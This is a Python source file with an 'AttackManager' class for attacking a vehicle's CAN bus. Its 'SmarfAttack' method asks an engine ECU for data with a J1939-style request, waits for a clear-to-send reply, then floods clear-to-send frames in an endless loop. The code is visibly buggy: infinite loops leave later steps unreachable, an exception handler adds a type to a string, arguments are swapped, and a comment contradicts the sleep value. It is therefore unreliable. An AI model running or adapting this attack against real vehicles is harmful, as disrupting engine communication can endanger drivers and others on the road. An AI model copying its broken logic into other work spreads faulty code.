import socket
import struct
import sys
import binascii
import array
import SocketManager, sys, signal
import time


class AttackManager:
	
	def __init__(self,interface):
		self.interface = interface

	def __del__(self):
		print ("AttackManager deleted")


	def SmarfAttack(self,data_len , first_step , first_step_data ,second_step , third_step ,third_step_data , forth_step , final_step ,final_step_data  ):
		
		try:
			socket = SocketManager.SocketManager(self.interface)
		except Exception as inst:
			print ( type (inst) + first_step )

		while True:
			
			print (first_step)
			
			#first step : sending 80EA00F9 request on bus for asking engine to send data
			socket.SendMessage(first_step, data_len, first_step_data )
			
			#second step: waiting for engine to send a clear to send message
			cf= socket.GetMessage(self.interface)
			while (cf[0] != second_step):
				socket.SendMessage(first_step, data_len, first_step_data )
				cf= socket.GetMessage(self.interface)
			
			while True:
				#Third step: sending clear to send message for engine

				socket.SendMessage(third_step, data_len, third_step_data)
				#print ("one Round")
				#time.sleep(1) # delays for 5 seconds	
				
			#Final step: engine sends pack of data to you
			cf = socket.GetMessage(self.interface)
			while (cf[0] != forth_step ):
				print (first_step)
				#print("We are here")
				cf = socket.GetMessage(self.interface)
			
			print ("1 pack of messages got from engine")		
			socket.SendMessage( data_len , final_step, final_step_data)	

			break;


	def GetData(self,data_len , first_step , first_step_data ,second_step , third_step ,third_step_data , forth_step , final_step ,final_step_data  ):
		
		try:
			socket = SocketManager.SocketManager(self.interface)
		except Exception as inst:
			print ( type (inst) + first_step )

		while True:
			
			print (first_step)
			
			#first step : sending 80EA00F9 request on bus for asking engine to send data
			socket.SendMessage(first_step, data_len, first_step_data )
			
			print (first_step)
			
			#second step: waiting for engine to send a clear to send message
			cf= socket.GetMessage(self.interface)
			while (cf[0] != second_step):
				cf= socket.GetMessage(self.interface)
			
			while True:
				#Third step: sending clear to send message for engine

				socket.SendMessage(third_step, data_len, third_step_data)
				#print ("one Round")
				time.sleep(1) # delays for 5 seconds	
				
			#Final step: engine sends pack of data to you
			cf = socket.GetMessage(self.interface)
			while (cf[0] != forth_step ):
				print (first_step)
				#print("We are here")
				cf = socket.GetMessage(self.interface)
			
			print ("1 pack of messages got from engine")		
			socket.SendMessage( data_len , final_step, final_step_data)	

			break;



